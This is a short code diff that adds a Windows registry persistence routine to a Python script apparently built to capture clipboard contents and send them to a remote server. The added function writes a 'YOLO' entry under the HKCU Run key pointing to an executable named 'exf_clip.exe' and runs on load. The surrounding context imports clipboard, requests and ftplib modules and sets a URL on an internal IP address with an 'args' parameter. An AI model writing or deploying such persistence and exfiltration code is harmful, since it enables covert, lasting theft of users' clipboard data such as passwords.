@@ -1,5 +1,20 @@
 import clipboard, requests
 import pyautogui, ftplib, os
+from _winreg import *
+
+def persistence():
+    run_key = r'Software\Microsoft\Windows\CurrentVersion\Run'
+    bin_path = "C:\Users\Administrateur\Py\dist\exf_clip.exe"
+
+    try:
+        reg_key = OpenKey(HKEY_CURRENT_USER, run_key, 0, KEY_WRITE)
+        SetValueEx(reg_key, 'YOLO', 0, REG_SZ, bin_path)
+        CloseKey(reg_key)
+        return True, 'HKCU Run registry key applied'
+    except WindowsError:
+        return False, 'HKCU Run registry key failed' 
+
+persistence()
 
 url = "http://10.101.200.34/test.php?args="
 
